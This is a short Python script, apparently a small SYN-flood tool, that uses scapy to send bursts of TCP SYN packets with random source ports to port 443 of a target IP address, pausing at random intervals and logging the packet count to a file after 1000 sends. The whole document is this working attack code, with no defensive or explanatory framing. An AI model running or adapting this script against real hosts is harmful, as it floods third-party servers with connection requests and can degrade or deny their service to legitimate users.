from scapy.all import IP, TCP, send  
from random import randint , uniform
from time import sleep

i = 0
def tarrer(ip_addr):
    ip = IP(dst=ip_addr)
    global i
    while True:
        tcp = TCP(sport=randint(2000,60000), dport=443, flags="S") 
        send(ip/tcp)
        i += 1
        sleep(0.01)
        if i % 100 == 0:
            if i  == 1000:
                with open("runner.txt","a") as f:
                    f.write(f"\n{i}")
                break
            sleep(uniform(0.1,0.5))
